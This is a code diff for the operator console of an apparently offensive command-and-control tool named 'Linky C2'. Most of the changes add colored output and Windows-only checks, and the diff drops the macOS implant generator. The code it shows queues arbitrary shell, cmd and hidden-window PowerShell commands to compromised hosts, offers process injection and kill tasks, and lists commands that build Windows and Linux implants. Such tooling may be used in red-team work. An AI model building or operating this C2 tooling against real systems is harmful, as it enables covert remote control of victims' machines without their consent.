@@ -1,3 +1,4 @@
+use colored::Colorize;
 use rustyline::{error::ReadlineError, DefaultEditor};
 use std::sync::{Arc, Mutex};
 use uuid::Uuid;
@@ -6,7 +7,7 @@ use crate::generate;
 use crate::links::{LinkStatus, Links};
 
 pub fn run(links: Arc<Mutex<Links>>) {
-    println!("Linky C2 – type 'help' for commands\n");
+    println!("{}", "Linky C2 – type 'help' for commands\n".bold());
 
     let mut rl = DefaultEditor::new().expect("readline init failed");
 
@@ -36,13 +37,6 @@ pub fn run(links: Arc<Mutex<Links>>) {
                             generate::generate_linux(rest);
                         }
                     }
-                    "generate-osx" => {
-                        if rest.is_empty() {
-                            println!("Usage: generate-osx <ip:port>");
-                        } else {
-                            generate::generate_osx(rest);
-                        }
-                    }
                     "generate-native" => {
                         if rest.is_empty() {
                             println!("Usage: generate-native <ip:port>");
@@ -70,6 +64,9 @@ pub fn run(links: Arc<Mutex<Links>>) {
 // ── Links submenu ────────────────────────────────────────────────────────────
 
 fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
+    println!("\n{}", "╔══════════════════════════════╗".cyan().bold());
+    println!("{}", "║          LINKS MENU          ║".cyan().bold());
+    println!("{}\n", "╚══════════════════════════════╝".cyan().bold());
     print_links_table(links);
 
     loop {
@@ -84,10 +81,10 @@ fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
 
                 match cmd {
                     "-h" | "help" => {
-                        println!("  -a          Show all links (including inactive)");
-                        println!("  -i <name>   Interact with a link");
-                        println!("  -k <name>   Send kill task + mark exited");
-                        println!("  back        Return to main menu");
+                        println!("  {}          Show all links (including inactive)", "-a".yellow());
+                        println!("  {}   Interact with a link", "-i <name>".yellow());
+                        println!("  {}   Send kill task + mark exited", "-k <name>".yellow());
+                        println!("  {}        Return to main menu", "back".yellow());
                     }
                     "-a" => print_links_table(links),
                     "-i" => {
@@ -96,7 +93,7 @@ fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
                         } else if let Some(id) = resolve_link(links, rest) {
                             interact(links, id, rl);
                         } else {
-                            println!("[-] Link not found: {}", rest);
+                            println!("{} Link not found: {}", "[-]".red(), rest);
                         }
                     }
                     "-k" => {
@@ -106,13 +103,19 @@ fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
                             let mut l = links.lock().unwrap();
                             l.add_task(id, "exit".into(), "kill".into());
                             l.kill_link(id);
-                            println!("[+] Kill task queued.");
+                            println!("{} Kill task queued.", "[+]".green());
                         } else {
-                            println!("[-] Link not found: {}", rest);
+                            println!("{} Link not found: {}", "[-]".red(), rest);
                         }
                     }
                     "back" | "exit" | "q" => break,
-                    _ => println!("Unknown. Type -h for help."),
+                    "generate" | "generate-linux" | "generate-native" | "links" | "kill" | "quit" => {
+                        println!(
+                            "'{}' is a top-level command. Type 'back' to return to the main menu first.",
+                            cmd
+                        );
+                    }
+                    _ => println!("Unknown command '{}'. Type -h for help.", cmd),
                 }
             }
             Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
@@ -125,22 +128,27 @@ fn print_links_table(links: &Arc<Mutex<Links>>) {
     let links = links.lock().unwrap();
     let all = links.all_links();
     if all.is_empty() {
-        println!("No links registered.");
+        println!("{} No links registered.", "[*]".cyan());
         return;
     }
     println!(
-        "\n{:<12} {:<24} {:<18} {:<12} {:<10}",
-        "Name", "User@Host", "IP", "Platform", "Status"
+        "\n{}",
+        format!(
+            "{:<12} {:<24} {:<18} {:<12} {:<10}",
+            "Name", "User@Host", "IP", "Platform", "Status"
+        )
+        .cyan()
+        .bold()
     );
-    println!("{}", "─".repeat(78));
+    println!("{}", "─".repeat(78).cyan());
     for l in all {
         let status = match l.status {
-            LinkStatus::Active => "Active",
-            LinkStatus::Inactive => "Inactive",
-            LinkStatus::Exited => "Exited",
+            LinkStatus::Active => "Active".green().bold().to_string(),
+            LinkStatus::Inactive => "Inactive".yellow().to_string(),
+            LinkStatus::Exited => "Exited".red().to_string(),
         };
         println!(
-            "{:<12} {:<24} {:<18} {:<12} {:<10}",
+            "{:<12} {:<24} {:<18} {:<12} {}",
             l.name,
             format!("{}@{}", l.username, l.hostname),
             l.internal_ip,
@@ -158,8 +166,12 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
         let l = links.lock().unwrap();
         if let Some(link) = l.get_link(link_id) {
             println!(
-                "\n[*] Interacting with {} – {}@{} [{}]",
-                link.name, link.username, link.hostname, link.platform
+                "\n{} Interacting with {} – {}@{} [{}]",
+                "[*]".cyan(),
+                link.name.bold(),
+                link.username,
+                link.hostname,
+                link.platform.yellow()
             );
             println!("    Type 'help' for commands, 'back' to return\n");
         }
@@ -190,27 +202,52 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                         let mut l = links.lock().unwrap();
                         l.add_task(link_id, "exit".into(), "kill".into());
                         l.kill_link(link_id);
-                        println!("[+] Kill task queued.");
+                        println!("{} Kill task queued.", "[+]".green());
                         break;
                     }
 
                     // ── Shell execution helpers ──────────────────────────
-                    "cmd" => queue(links, link_id, format!("cmd /C {}", args), line.clone()),
+                    "cmd" => {
+                        if !is_windows(links, link_id) {
+                            println!("{} 'cmd' is a Windows-only command.", "[-]".red());
+                        } else {
+                            queue(links, link_id, format!("cmd /C {}", args), line.clone());
+                        }
+                    }
                     "shell" => queue(links, link_id, line.clone(), line.clone()),
-                    "powershell" | "ps" => queue(
-                        links,
-                        link_id,
-                        format!("powershell -noP -sta -w 1 -c \"{}\"", args),
-                        line.clone(),
-                    ),
+                    "powershell" | "ps" => {
+                        if !is_windows(links, link_id) {
+                            println!("{} 'powershell' is a Windows-only command.", "[-]".red());
+                        } else {
+                            queue(
+                                links,
+                                link_id,
+                                format!("powershell -noP -sta -w 1 -c \"{}\"", args),
+                                line.clone(),
+                            );
+                        }
+                    }
 
                     // ── Built-in navigation ─────────────────────────────
-                    "cd" | "pwd" | "ls" | "whoami" | "pid" | "integrity" => {
+                    "cd" | "pwd" | "ls" | "whoami" | "pid" => {
                         queue(links, link_id, line.clone(), line.clone())
+                    }
+                    "integrity" => {
+                        if !is_windows(links, link_id) {
+                            println!("{} 'integrity' is a Windows-only command.", "[-]".red());
+                        } else {
+                            queue(links, link_id, line.clone(), line.clone());
+                        }
                     }
 
                     // ── Process injection ───────────────────────────────
-                    "inject" => queue(links, link_id, line.clone(), line.clone()),
+                    "inject" => {
+                        if !is_windows(links, link_id) {
+                            println!("{} 'inject' is a Windows-only command.", "[-]".red());
+                        } else {
+                            queue(links, link_id, line.clone(), line.clone());
+                        }
+                    }
 
                     // ── Catch-all: send raw ─────────────────────────────
                     _ => queue(links, link_id, line.clone(), line.clone()),
@@ -240,12 +277,21 @@ fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
             link.last_checkin.format("%Y-%m-%d %H:%M:%S")
         );
         let status = match link.status {
-            LinkStatus::Active => "Active",
-            LinkStatus::Inactive => "Inactive",
-            LinkStatus::Exited => "Exited",
+            LinkStatus::Active => "Active".green().bold().to_string(),
+            LinkStatus::Inactive => "Inactive".yellow().to_string(),
+            LinkStatus::Exited => "Exited".red().to_string(),
         };
-        println!("  Status    : {}", status);
+        println!("  {}    : {}", "Status".cyan(), status);
     }
+}
+
+fn is_windows(links: &Arc<Mutex<Links>>, link_id: Uuid) -> bool {
+    links
+        .lock()
+        .unwrap()
+        .get_link(link_id)
+        .map(|l| l.platform == "windows")
+        .unwrap_or(false)
 }
 
 fn queue(links: &Arc<Mutex<Links>>, link_id: Uuid, command: String, cli_cmd: String) {
@@ -271,7 +317,6 @@ fn print_help() {
     println!("  links                    Manage active links");
     println!("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
     println!("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
-    println!("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
     println!("  generate-native <ip:port> Build native Linux implant (x86_64-unknown-linux-gnu)");
     println!("  help                     Show this help");
     println!("  exit / kill              Quit linky");
